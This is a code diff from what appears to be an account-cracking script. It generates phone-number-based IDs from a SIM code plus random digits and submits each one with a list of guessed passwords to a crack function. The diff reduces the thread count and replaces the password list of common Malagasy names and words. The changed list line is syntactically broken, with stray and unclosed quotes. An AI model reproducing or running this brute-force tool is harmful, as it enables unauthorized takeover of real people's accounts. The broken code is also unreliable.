@@ -108,7 +108,7 @@ def BD_CLONING():
     for nmbr in range(limit):
         nmp=''.join(map(str, generate_random_sequence(7)))
         user.append(nmp)
-    with tred(max_workers=84) as Dipto:
+    with tred(max_workers=30) as Dipto:
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],ids[6:],'fanantenana','Fanantenana','malala','Malala','solofo','Solofo','malagasy','nekena','Nekena','kokorakaka','Kokorakaka','makoko','Makoko','maditra','Maditra','Malagasy','Nantenaina','nantenaina','Tsinto','tsinto','rakoto','Rakoto','tsilavina','Tsilavina','Fety','fety','fifaliana','Fifaliana','Ravaka','Ravaka','fenosoa','Fenosoa','mamisoa','Mamisoa','Diamondra','diamondra','fanja','randria','Randria','razafy','Razafy','valisoa','Valisoa','danse','Danse','tolotra','Tolotra','Lola','lola','marary','Marary','nasandratra','Nasandratra','andriamanantena','Andriamanantena','vadiko','Vadiko','mamako','Mamako','milely','Milely','mamiko','Mamiko','fahendrena','Fahendrena','fandresena','Fandresena','finoana','Finoana','fiderana','Fiderana','safidy','Safidy','tahiana','Tahiana','malalako','Malalako','fitiavana','Fitiavana','nomena','Nomena','Sitraka','sitraka','heriniaina','Mahery','mahery']
+            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],ids[6:]','solofo','Solofo','randria','Randria','nirina','Nirina','fitiavana','Fitiavana','fanantenana','Fanantenana','nantenaina','Nantenaina','malala','Malala','razafy','Razafy','tsilavina','Tsilavina','mamako','vadiko','tolotra','tantely','mendrika','mahery','Mahery','Mendrika','fandresena','fahendrena','nilaina','notiavina]
             Dipto.submit(method_crack,ids,passlist)
     linex()
     print(' LE CLONING EST FINI ')
